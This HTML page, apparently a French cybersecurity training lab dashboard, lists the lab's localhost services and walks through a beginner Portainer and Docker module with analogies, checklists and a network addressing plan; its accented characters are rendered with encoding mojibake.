<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üõ°Ô∏è CyberLab Genesis - Guide d'Exploration Avanc√©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: #ffffff;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, rgba(0,255,136,0.1), rgba(0,100,255,0.1));
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid rgba(0,255,136,0.2);
        }

        .header h1 {
            font-size: 2.5em;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0,255,136,0.5);
            margin-bottom: 10px;
        }

        .lab-stats {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 15px;
        }

        .stat-item {
            background: rgba(255,255,255,0.1);
            padding: 10px 20px;
            border-radius: 15px;
            text-align: center;
        }

        .stat-number {
            font-size: 1.5em;
            font-weight: bold;
            color: #00ff88;
        }

        .stat-label {
            font-size: 0.9em;
            color: #cccccc;
        }

        .tabs-container {
            background: rgba(0,0,0,0.3);
            padding: 0;
            border-bottom: 1px solid #333;
        }

        .tabs {
            display: flex;
            overflow-x: auto;
            scrollbar-width: thin;
        }

        .tab {
            background: rgba(255,255,255,0.05);
            border: none;
            color: #cccccc;
            padding: 15px 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            border-bottom: 3px solid transparent;
            font-size: 1em;
        }

        .tab:hover {
            background: rgba(255,255,255,0.1);
            color: #ffffff;
        }

        .tab.active {
            background: linear-gradient(135deg, rgba(0,255,136,0.2), rgba(0,100,255,0.1));
            color: #00ff88;
            border-bottom: 3px solid #00ff88;
        }

        .tab-content {
            display: none;
            padding: 0;
            min-height: 80vh;
        }

        .tab-content.active {
            display: block;
        }

        .service-overview {
            padding: 30px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }

        .service-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
            border-radius: 15px;
            padding: 20px;
            border: 2px solid transparent;
            transition: all 0.3s ease;
        }

        .service-card:hover {
            border-color: #00ff88;
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,255,136,0.2);
        }

        .service-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .service-icon {
            font-size: 2em;
            margin-right: 15px;
        }

        .service-title {
            font-size: 1.2em;
            font-weight: bold;
            color: #00ff88;
        }

        .service-desc {
            color: #cccccc;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .service-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .status-badge {
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
        }

        .status-ready {
            background: #00ff88;
            color: #1a1a2e;
        }

        .status-coming {
            background: #ffaa00;
            color: #1a1a2e;
        }

        /* Portainer Page Styles */
        .portainer-page {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .page-header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(0,123,255,0.1), rgba(0,100,255,0.05));
            border-radius: 20px;
            border: 2px solid rgba(0,123,255,0.2);
        }

        .page-title {
            font-size: 2.5em;
            color: #007bff;
            margin-bottom: 10px;
        }

        .learning-path {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
        }

        .step-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
            border-radius: 20px;
            padding: 30px;
            border-left: 5px solid #007bff;
        }

        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .step-number {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 20px;
        }

        .step-title {
            font-size: 1.5em;
            color: #007bff;
            font-weight: bold;
        }

        .step-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 20px;
        }

        .theory-section {
            background: rgba(0,123,255,0.1);
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #007bff;
        }

        .practice-section {
            background: rgba(40,167,69,0.1);
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #28a745;
        }

        .section-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .theory .section-title {
            color: #66aaff;
        }

        .practice .section-title {
            color: #28a745;
        }

        .objectives-list {
            list-style: none;
            margin-bottom: 20px;
        }

        .objectives-list li {
            padding: 8px 0;
            color: #cccccc;
            display: flex;
            align-items: center;
        }

        .objectives-list li:before {
            content: "üéØ";
            margin-right: 10px;
            font-size: 1.1em;
        }

        .interactive-exercise {
            background: rgba(255,193,7,0.1);
            border: 2px solid #ffc107;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }

        .exercise-title {
            color: #ffc107;
            font-size: 1.3em;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .checklist {
            background: rgba(0,0,0,0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
        }

        .checklist-item {
            display: flex;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .checklist-item:last-child {
            border-bottom: none;
        }

        .checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #666;
            border-radius: 4px;
            margin-right: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .checkbox.checked {
            background: #00ff88;
            border-color: #00ff88;
        }

        .checkbox.checked::after {
            content: "‚úì";
            color: #1a1a2e;
            font-weight: bold;
        }

        .terminal-sim {
            background: #1e1e1e;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #333;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }

        .terminal-header {
            background: #2d2d2d;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            font-size: 0.9em;
        }

        .terminal-dots {
            display: flex;
            gap: 6px;
            margin-right: 15px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot.red { background: #ff5f56; }
        .dot.yellow { background: #ffbd2e; }
        .dot.green { background: #27ca3f; }

        .terminal-body {
            padding: 20px;
            line-height: 1.6;
        }

        .command {
            color: #00ff88;
            margin-bottom: 8px;
        }

        .output {
            color: #cccccc;
            margin-bottom: 15px;
            white-space: pre-wrap;
        }

        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
            font-weight: bold;
            margin: 8px 5px;
        }

        .btn-primary {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
        }

        .btn-primary:hover {
            background: linear-gradient(45deg, #0056b3, #004085);
            transform: translateY(-2px);
        }

        .btn-success {
            background: linear-gradient(45deg, #28a745, #1e7e34);
            color: white;
        }

        .btn-warning {
            background: linear-gradient(45deg, #ffc107, #d39e00);
            color: #1a1a2e;
        }

        .tips-box {
            background: linear-gradient(135deg, rgba(23,162,184,0.1), rgba(23,162,184,0.05));
            border-left: 4px solid #17a2b8;
            padding: 20px;
            border-radius: 0 15px 15px 0;
            margin: 25px 0;
        }

        .tips-box h4 {
            color: #17a2b8;
            margin-bottom: 12px;
            font-size: 1.2em;
        }

        .docker-concept {
            background: linear-gradient(135deg, rgba(0,123,255,0.08), rgba(0,123,255,0.03));
            border: 1px solid #007bff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .docker-concept h4 {
            color: #007bff;
            margin-bottom: 10px;
        }

        @media (max-width: 768px) {
            .step-content {
                grid-template-columns: 1fr;
            }
            
            .lab-stats {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <h1>üõ°Ô∏è CyberLab Genesis</h1>
        <p>Guide d'Exploration Avanc√© - D√©couverte Progressive des Services</p>
        
        <div class="lab-stats">
            <div class="stat-item">
                <div class="stat-number">12</div>
                <div class="stat-label">Services Total</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">11</div>
                <div class="stat-label">Op√©rationnels</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">92%</div>
                <div class="stat-label">Taux de R√©ussite</div>
            </div>
        </div>
    </div>

    <!-- Navigation Tabs -->
    <div class="tabs-container">
        <div class="tabs">
            <button class="tab active" onclick="showTab('overview')">üè† Vue d'ensemble</button>
            <button class="tab" onclick="showTab('portainer')">üê≥ Portainer</button>
            <button class="tab" onclick="showTab('wazuh')">üõ°Ô∏è Wazuh SIEM</button>
            <button class="tab" onclick="showTab('dvwa')">üéØ DVWA</button>
            <button class="tab" onclick="showTab('webgoat')">üêê WebGoat</button>
            <button class="tab" onclick="showTab('juiceshop')">üßÉ Juice Shop</button>
            <button class="tab" onclick="showTab('kibana')">üìä Kibana</button>
            <button class="tab" onclick="showTab('grafana')">üìà Grafana</button>
            <button class="tab" onclick="showTab('phpmyadmin')">üóÑÔ∏è phpMyAdmin</button>
            <button class="tab" onclick="showTab('winlab')">üñ•Ô∏è Windows AD Lab</button>
        </div>
    </div>

    <!-- Tab Contents -->
    
    <!-- Overview Tab -->
    <div class="tab-content active" id="overview">
        <div class="service-overview">
            <h2>üè† Vue d'ensemble du Laboratoire</h2>
            <p>CyberLab Genesis comprend 12 services int√©gr√©s pour une formation compl√®te en cybers√©curit√©.</p>
            
            <div class="services-grid">
                <!-- Portainer -->
                <div class="service-card" onclick="showTab('portainer')">
                    <div class="service-header">
                        <div class="service-icon">üê≥</div>
                        <div class="service-title">Portainer</div>
                    </div>
                    <div class="service-desc">Interface graphique pour la gestion Docker. Comprenez l'architecture du lab et administrez les conteneurs.</div>
                    <div class="service-status">
                        <div class="status-badge status-ready">PR√äT</div>
                        <a href="http://127.0.0.1:9000" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Wazuh -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üõ°Ô∏è</div>
                        <div class="service-title">Wazuh SIEM</div>
                    </div>
                    <div class="service-desc">Syst√®me de d√©tection d'intrusions et monitoring s√©curit√©. Analysez les logs et d√©tectez les menaces.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="https://127.0.0.1:5443" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- DVWA -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üéØ</div>
                        <div class="service-title">DVWA</div>
                    </div>
                    <div class="service-desc">Damn Vulnerable Web Application. Application web intentionnellement vuln√©rable pour l'apprentissage.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8081" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- WebGoat -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üêê</div>
                        <div class="service-title">WebGoat</div>
                    </div>
                    <div class="service-desc">Plateforme d'apprentissage OWASP interactive. Le√ßons pratiques sur les vuln√©rabilit√©s web.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8082/WebGoat" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Juice Shop -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üßÉ</div>
                        <div class="service-title">Juice Shop</div>
                    </div>
                    <div class="service-desc">Application e-commerce moderne avec vuln√©rabilit√©s r√©alistes. Challenges progressifs.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8083" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Kibana -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üìä</div>
                        <div class="service-title">Kibana</div>
                    </div>
                    <div class="service-desc">Visualisation et analyse des logs Elasticsearch. Dashboards et recherches avanc√©es.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:5601" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Grafana -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üìà</div>
                        <div class="service-title">Grafana</div>
                    </div>
                    <div class="service-desc">Dashboards de monitoring et m√©triques. Surveillance en temps r√©el des services.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:3000" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- phpMyAdmin -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üóÑÔ∏è</div>
                        <div class="service-title">phpMyAdmin</div>
                    </div>
                    <div class="service-desc">Administration MySQL via interface web. Gestion des bases de donn√©es du laboratoire.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8090" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Windows AD Lab -->
                <div class="service-card" onclick="showTab('winlab')">
                    <div class="service-header">
                        <div class="service-icon">üñ•Ô∏è</div>
                        <div class="service-title">Windows AD Lab</div>
                    </div>
                    <div class="service-desc">Environnement Active Directory vuln√©rable. Domaine Windows avec DC, clients et failles configur√©es pour pentest avanc√©.</div>
                    <div class="service-status">
                        <div class="status-badge status-ready">PR√äT</div>
                        <button class="btn btn-primary" onclick="event.stopPropagation(); showTab('winlab')">Explorer</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Portainer Tab -->
    <!-- Portainer Tab -->
    <div class="tab-content" id="portainer">
        <div class="portainer-page">
            <div class="page-header">
                <div class="page-title">üê≥ Portainer - Ma√Ætrise Docker</div>
                <p>Interface graphique pour comprendre et administrer l'infrastructure de conteneurs</p>
            </div>

            <!-- Vid√©o de pr√©sentation -->
            <div style="background: rgba(0,123,255,0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                <h3 style="color: #007bff; margin-bottom: 15px;">üì∫ Pr√©sentation Portainer</h3>
                <div style="background: #000; padding: 40px; border-radius: 10px; text-align: center; color: #666;">
                    <div style="font-size: 3em; margin-bottom: 10px;">‚ñ∂Ô∏è</div>
                    <p><strong>Vid√©o :</strong> "Portainer - L'interface qui r√©volutionne Docker"</p>
                    <p style="font-size: 0.9em;">Dur√©e : 12min | Niveau : D√©butant</p>
                    <a href="https://www.youtube.com/watch?v=8q9k1qzXRk4" target="_blank" class="btn btn-primary">üé¨ Voir la Vid√©o</a>
                </div>
            </div>

            <!-- Formation compl√©mentaire GRATUITE -->
            <div style="background: rgba(40, 167, 69, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                <h3 style="color: #28a745; margin-bottom: 15px;">üéì Formations Gratuites Recommand√©es</h3>
                <p><strong>Pour approfondir vos connaissances Docker (100% GRATUIT) :</strong></p>
                <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 15px;">
                    <a href="https://openclassrooms.com/fr/courses/2035766-optimisez-votre-deploiement-en-creant-des-conteneurs-avec-docker" target="_blank" class="btn btn-success">
                        üìö OpenClassrooms - Docker
                    </a>
                    <a href="https://www.youtube.com/watch?v=3c-iBn73dDE" target="_blank" class="btn btn-primary">
                        üé¨ FreeCodeCamp - Docker (6h)
                    </a>
                    <a href="https://www.youtube.com/c/xavki-linux/playlists" target="_blank" class="btn btn-warning">
                        üéØ Xavki - Tutoriels FR (30+ vid√©os)
                    </a>
                    <a href="https://www.devopssec.fr/category/apprendre-docker" target="_blank" class="btn btn-info">
                        üìö DevOpsSec - Cours Complet FR
                    </a>
                    <a href="https://docs.portainer.io/" target="_blank" class="btn btn-secondary">
                        üìñ Documentation Portainer
                    </a>
                </div>
                <p style="margin-top: 10px; font-size: 0.9em;"><em>üí° Ces formations vous donneront les bases th√©oriques, puis revenez pratiquer ici !</em></p>
            </div>

            <!-- Comprendre Docker avec des analogies -->
            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 20px; margin: 20px 0;">
                <h3 style="color: #b8860b; margin-bottom: 15px;">üß† Docker expliqu√© simplement</h3>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
                    <div style="background: rgba(255,255,255,0.8); padding: 15px; border-radius: 10px;">
                        <h4>üè† Conteneur = Appartement meubl√©</h4>
                        <p>Imaginez que vous d√©m√©nagez. Un conteneur, c'est comme un appartement meubl√© avec tout ce qu'il faut : meubles, √©lectrom√©nager, internet. Vous arrivez, vous vous installez, √ßa marche imm√©diatement !</p>
                    </div>
                    <div style="background: rgba(255,255,255,0.8); padding: 15px; border-radius: 10px;">
                        <h4>üèòÔ∏è Docker = R√©sidence avec concierge</h4>
                        <p>Docker, c'est la r√©sidence qui g√®re tous vos appartements meubl√©s. Il s'occupe de l'√©lectricit√©, de l'eau, de la s√©curit√©. Vous, vous vous contentez de vivre dedans !</p>
                    </div>
                    <div style="background: rgba(255,255,255,0.8); padding: 15px; border-radius: 10px;">
                        <h4>üéõÔ∏è Portainer = Tableau de bord du syndic</h4>
                        <p>Au lieu d'appeler le concierge √† chaque fois, Portainer vous donne un √©cran tactile pour tout contr√¥ler : voir qui habite o√π, allumer/√©teindre les appartements, surveiller la consommation.</p>
                    </div>
                </div>
            </div>

            <div class="learning-path">
                
                <!-- Module 1: Interface Portainer -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">1</div>
                        <div class="step-title">Premi√®re Connexion & Interface</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Comprendre l'interface</div>
                            <div class="docker-concept" style="background: rgba(0,123,255,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #007bff; color: #333;">
                                <h4 style="color: #007bff;">üõ† Pourquoi Portainer ?</h4>
                                <p style="color: #555;"><strong>Analogie :</strong> Imaginez que vous √™tes le gardien d'un immeuble de 13 appartements (conteneurs). Sans Portainer, vous devriez frapper √† chaque porte, noter sur papier qui est l√†, v√©rifier les compteurs un par un...</p>
                                
                                <p style="color: #555;"><strong>Avec Portainer :</strong> Vous avez un √©cran de contr√¥le central ! D'un coup d'≈ìil, vous voyez :</p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>‚úÖ Quels appartements sont occup√©s (conteneurs actifs)</li>
                                    <li>üè† Qui habite o√π (services et ports)</li>
                                    <li>‚ö° La consommation √©lectrique (CPU/RAM)</li>
                                    <li>üîß Les pannes √©ventuelles (logs d'erreur)</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üéØ En termes techniques :</strong> Portainer transforme les commandes Docker complexes (docker ps, docker stats, docker logs...) en interface graphique intuitive. Plus besoin de m√©moriser des commandes !
                                </div>
                                
                                <div style="background: rgba(255,193,7,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üßë‚Äçüíº R√¥le du syndic num√©rique :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Tableau de bord :</strong> Vue d'ensemble de tous vos "locataires" Docker</li>
                                        <li><strong>Gestion simplifi√©e :</strong> Cliquez au lieu de taper des commandes</li>
                                        <li><strong>Surveillance temps r√©el :</strong> Alertes automatiques en cas de probl√®me</li>
                                        <li><strong>Contr√¥le d'acc√®s :</strong> Qui peut faire quoi sur quels conteneurs</li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üõ† Connexion Guid√©e</div>
                            <ul class="objectives-list">
                                <li>Ma√Ætriser l'interface Portainer (votre "tableau de bord de syndic")</li>
                                <li>Comprendre l'architecture CyberLab (votre "r√©sidence s√©curis√©e")</li>
                                <li>Naviguer dans les sections principales</li>
                                <li>Observer les m√©triques syst√®me (comme regarder les compteurs)</li>
                            </ul>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 1.1: Premi√®re visite de la r√©sidence</div>
                                
                                <div style="background: #1e1e1e; color: #00ff88; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0;">
                                    <div style="color: #ccc; margin-bottom: 10px;"># Test de connectivit√© - "Sonnette d'entr√©e"</div>
                                    <div class="command">$ curl -I http://127.0.0.1:9000</div>
                                    <div class="output">HTTP/1.1 200 OK
Server: Portainer
‚úÖ Portainer accessible - L'entr√©e est ouverte !</div>
                                </div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üö™ Ouvrir Portainer : http://127.0.0.1:9000</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üîë Se connecter avec credentials (vos cl√©s de syndic)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üè† Dashboard ‚Üí Compter ~13 containers actifs (appartements occup√©s)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üìã Menu gauche ‚Üí Explorer les sections (comme les √©tages de l'immeuble)</span>
                                    </div>
                                </div>
                                
                                <div>
                                    <a href="http://127.0.0.1:9000" target="_blank" class="btn btn-primary">üöÄ Ouvrir Portainer</a>
                                    <button class="btn btn-warning" onclick="showPortainerSolution(1)">üí° Solution</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Module 2: Analyse Conteneurs -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">2</div>
                        <div class="step-title">Analyse des Conteneurs CyberLab</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìä Les "locataires" de votre r√©sidence</div>
                            <div class="docker-concept" style="background: rgba(40,167,69,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #28a745; color: #333;">
                                <h4 style="color: #28a745;">üè† Analogie des appartements sp√©cialis√©s</h4>
                                <p style="color: #555;">Dans votre r√©sidence CyberLab, chaque "appartement" (conteneur) a une fonction sp√©cifique :</p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üåê <strong>Dashboard</strong> = R√©ception/Accueil (port 8080) - l√† o√π arrivent les visiteurs</li>
                                    <li>üéØ <strong>WebGoat</strong> = Salle de formation (port 8082) - pour apprendre la s√©curit√©</li>
                                    <li>üõ°Ô∏è <strong>DVWA</strong> = Laboratoire de tests (port 8081) - pour pratiquer les vuln√©rabilit√©s</li>
                                    <li>üçé <strong>Juice Shop</strong> = Boutique d'entra√Ænement (port 8083) - e-commerce vuln√©rable</li>
                                    <li>üê≥ <strong>Portainer</strong> = Bureau du syndic (port 9000) - votre poste de contr√¥le</li>
                                    <li>üêß <strong>Kali</strong> = Atelier de r√©paration - outils de pentesting</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîç CPU/Memory = Consommation √©lectrique :</strong> Comme un syndic surveille la consommation de chaque appartement, vous allez observer quels conteneurs consomment le plus de ressources.
                                </div>
                                
                                <div style="background: rgba(255,193,7,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìã √âtat des conteneurs - Codes couleur :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><span style="color: #28a745;">üü¢ Running</span> = Locataire pr√©sent et actif</li>
                                        <li><span style="color: #ffc107;">üü° Paused</span> = En pause (rare, pour maintenance)</li>
                                        <li><span style="color: #dc3545;">üî¥ Stopped</span> = Locataire parti, appartement vide</li>
                                        <li><span style="color: #6c757d;">‚ö´ Dead</span> = Probl√®me grave, intervention requise</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(220,53,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>‚ö° M√©triques importantes √† surveiller :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>CPU %</strong> = Processeur utilis√© (comme l'activit√© dans l'appartement)</li>
                                        <li><strong>Memory</strong> = RAM consomm√©e (espace de stockage temporaire)</li>
                                        <li><strong>Network I/O</strong> = Trafic internet (qui utilise le wifi ?)</li>
                                        <li><strong>Block I/O</strong> = Lecture/√©criture disque (stockage de donn√©es)</li>
                                    </ul>
                                </div>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 2.1: Inventaire des locataires</div>
                                
                                <p><strong>üéØ Mission :</strong> Faire le tour du propri√©taire ! Dans Portainer ‚Üí <strong>Containers</strong>, v√©rifiez que tous vos "locataires" sont bien l√† :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üåê cyberlab_dashboard (r√©ception - port 8080)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üéØ cyberlab_webgoat (salle de formation - port 8082)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üõ°Ô∏è cyberlab_dvwa (laboratoire - port 8081)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üçé cyberlab_juice_shop (boutique - port 8083)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üê≥ cyberlab_portainer (bureau syndic - port 9000)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üêß cyberlab_kali (atelier de r√©paration)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>‚ö° Observer CPU/Memory : qui consomme le plus ?</span>
                                    </div>
                                </div>
                                
                                <div style="background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,140,0,0.05)); border: 2px solid #ffd700; border-radius: 15px; padding: 15px; margin: 15px 0;">
                                    <p><strong>üí° Astuce de syndic :</strong> Cliquez sur le nom d'un conteneur pour voir ses d√©tails. C'est comme avoir la fiche compl√®te d'un locataire : quand il a emm√©nag√©, ce qu'il consomme, s'il y a des probl√®mes...</p>
                                </div>
                                
                                <button class="btn btn-warning" onclick="showPortainerSolution(2)">üí° Solution</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Module 3: R√©seaux -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">3</div>
                        <div class="step-title">Architecture R√©seau</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üåê Le "c√¢blage" de votre r√©sidence</div>
                            <div class="docker-concept" style="background: rgba(0,123,255,0.05); padding: 15px; border-radius: 10px; border-left: 4px solid #007bff; color: #333;">
                                <h4 style="color: #007bff;">üèóÔ∏è Analogie du r√©seau √©lectrique/internet</h4>
                                <p style="color: #555;"><strong>Le r√©seau Docker = Installation √©lectrique/internet de l'immeuble</strong></p>
                                <ul style="margin-left: 20px; color: #555;">
                                    <li>üè¢ <strong>v100_cyberlab_network</strong> = Le r√©seau priv√© de votre r√©sidence</li>
                                    <li>üåê <strong>172.35.0.0/24</strong> = Plage d'adresses internes (comme les num√©ros d'appartement)</li>
                                    <li>üö™ <strong>Gateway 172.35.0.1</strong> = Portail d'entr√©e principal</li>
                                    <li>üì´ Chaque conteneur a sa propre adresse (comme une bo√Æte aux lettres num√©rot√©e)</li>
                                </ul>
                                
                                <div style="background: rgba(0,123,255,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üîß Technique :</strong> Ce r√©seau "bridge" permet √† tous les conteneurs de communiquer entre eux en interne, tout en √©tant isol√©s de l'ext√©rieur. C'est comme un r√©seau priv√© d'entreprise.
                                </div>
                                
                                <div style="background: rgba(40,167,69,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üåê Types de r√©seaux Docker :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>Bridge</strong> = R√©seau priv√© isol√© (notre cas)</li>
                                        <li><strong>Host</strong> = Partage le r√©seau de la machine h√¥te</li>
                                        <li><strong>None</strong> = Aucun r√©seau (conteneur isol√©)</li>
                                        <li><strong>Overlay</strong> = R√©seau distribu√© (plusieurs machines)</li>
                                    </ul>
                                </div>
                                
                                <div style="background: rgba(255,193,7,0.1); padding: 10px; border-radius: 8px; margin: 10px 0; color: #333;">
                                    <strong>üìç Plan d'adressage CyberLab :</strong>
                                    <ul style="margin: 10px 0; padding-left: 20px;">
                                        <li><strong>172.35.0.1</strong> = Gateway (sortie Internet)</li>
                                        <li><strong>172.35.0.2</strong> = Portainer (votre bureau)</li>
                                        <li><strong>172.35.0.20</strong> = Dashboard (r√©ception)</li>
                                        <li><strong>172.35.0.80-83</strong> = Apps formation</li>
                                        <li><strong>172.35.0.100</strong> = Kali (atelier)</li>
                                    </ul>
                                </div>
                                
